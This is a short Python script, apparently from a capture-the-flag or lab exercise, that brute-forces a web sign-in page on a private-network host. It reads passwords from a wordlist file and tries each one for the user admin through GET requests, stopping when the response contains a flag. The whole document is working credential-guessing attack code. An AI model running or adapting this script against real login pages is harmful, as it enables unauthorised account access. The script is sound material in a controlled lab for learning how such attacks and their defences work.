import requests
import sys


url1 = "http://192.168.56.103/index.php?page=signin&username=admin&password="
url2 = "&Login=Login#"

with open("password.txt") as f:
    for line in f:
        p = line[:-1]
        req = url1 + p + url2
        print("test requete: %s" % req)
        r = requests.get(req)
        if r.text.find('flag') > -1:
            print(r.text)
            sys.exit()
